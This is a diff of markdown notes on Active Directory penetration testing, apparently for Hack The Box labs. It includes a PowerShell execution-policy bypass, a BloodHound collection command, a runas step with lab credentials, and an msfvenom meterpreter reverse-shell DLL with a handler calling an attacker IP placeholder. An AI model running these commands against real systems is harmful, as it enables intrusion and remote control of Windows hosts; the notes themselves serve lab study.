@@ -8,7 +8,7 @@
 
 ## **1. Powerview.ps1:**
 
-Place powerview.ps1 on normal W10 machine
+Place powerview.ps1 on normal Wc10 machine
 
 `powershell -ep bypass #bypass execution policy`
 
@@ -53,7 +53,7 @@ W10 download sharphound.ps1
 > Invoke-BloodHound -collectionmethod All -Domain Carbon.local -Zipfilename File.zip \
 ```
 
-**HTB:: (see IppSecRules**
+**HTB:: (see IppSecRules)**
 Once creds are found: (IE: active.htb/(\)svc_tgs:GGPStillStandingstrong18)
     + obtain shell access w/ low level user: (Window10 box w/ openvpn, sharphound.ps1)
         `cmd> runas /netonly /user:active.htb\svc_tgs cmd #will run without Windows10 validation specifiy PW as well`
@@ -133,7 +133,7 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 ***Vulnerable***
 
 ***Host dll***
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attack-ip> LPORT=5555 -d dll > shell.dll
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attack-ip> LPORT=5555 -f dll > shell.dll
 $ msfconsole use multi/handler set lhost <attack-ip> LPORT=5555 setpayload windows/x64/meterpreter/reverse_tcp run
 
 ***Setup file share***
